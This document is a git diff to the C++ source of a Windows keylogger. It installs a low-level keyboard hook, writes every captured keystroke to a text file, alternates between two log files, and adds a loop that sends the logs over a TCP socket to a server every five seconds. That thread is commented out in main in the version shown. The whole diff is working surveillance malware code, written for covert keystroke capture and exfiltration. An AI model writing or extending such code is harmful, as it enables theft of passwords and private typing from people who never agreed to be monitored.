@@ -15,6 +15,9 @@ bool shift = false;
 
 SOCKET socket_fd;
 
+string logfile = "f.txt";
+string streamfile = "f2.txt";
+
 string SERVER_IP = "127.0.0.1";
 const int SERVER_PORT = 1235; 
 
@@ -55,7 +58,7 @@ string filesize(const char n[]){
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-
+    cout << "e\n";
     if (nCode == HC_ACTION) {
         
         
@@ -69,11 +72,9 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             if (h >= 65 && h <= 90 && !shift) h += 32;
             char c = h;
             ofstream f;
-            f.open("f.txt", ios::app);
+            f.open(logfile, ios::app);
             f << c;
-            f.close();
-            // // cout << shift << "\n";
-            // cout << c << "\n";    
+            f.close();   
         }
 
         if (wParam == WM_SYSKEYUP || wParam == WM_KEYUP){
@@ -87,28 +88,38 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return(CallNextHookEx(NULL, nCode, wParam, lParam));
 }
 
-void run(){
-    
-}
 
 void send(SOCKET sock){
-    string size = filesize("f.txt");
+    string size = filesize(streamfile.c_str());
     string send = "'keylog\\f.txt'"+size+"b";
     sendstring(sock, send.c_str());
-    sendfile(sock, "f.txt");
+    sendfile(sock, streamfile.c_str());
+    sendfile(socket_fd, "b.txt");
+    string s = logfile;
+    logfile = streamfile;
+    streamfile = s;
 }
 
 void sender(){
-    // cout << "sender\n";
-    // if ((SERVER_IP = findIp("I-AET-PF4HBEHD")) == "potato") return;
+    while (true){
+        send(socket_fd);
+        this_thread::sleep_until(chrono::system_clock::now()+chrono::seconds(5));
+    }
 
+   
+}
 
-    send(socket_fd);
-    sendfile(socket_fd, "b.txt");
-
-
-
-    
+void runlog(){
+    HHOOK Kybd; 
+    Kybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
+    // Keep this app running until we're told to stop
+    MSG msg;
+    while (true) {
+        GetMessage(&msg, NULL, NULL, NULL);
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    UnhookWindowsHookEx(Kybd);
 }
 
 int main(){
@@ -145,32 +156,13 @@ int main(){
         return 1;
     }
     
-    auto t = chrono::system_clock::now();
-    // Connect to server
-    // Install the low-level keyboard & mouse hooks
-    HHOOK Kybd; 
-    Kybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
-    // Keep this app running until we're told to stop
-    MSG msg;
-    while (true) {
-        cout << "e\n";   
-        if ((chrono::system_clock::now()-t).count() >= 500000000){
-            UnhookWindowsHookEx(Kybd);
-            sender();
-            Kybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
-            cout << "send\n";
-            t = chrono::system_clock::now();
-        }
-        else{
-            GetMessage(&msg, NULL, NULL, NULL);
-            TranslateMessage(&msg);
-            DispatchMessage(&msg);
-        }
-    }
+    thread logger = thread(runlog);
+    // thread tcp = thread(sender);
+
+    logger.join();
+    // tcp.join();
 
     closesocket(socket_fd);
     WSACleanup();
-
-    UnhookWindowsHookEx(Kybd);
     return 0;
 }
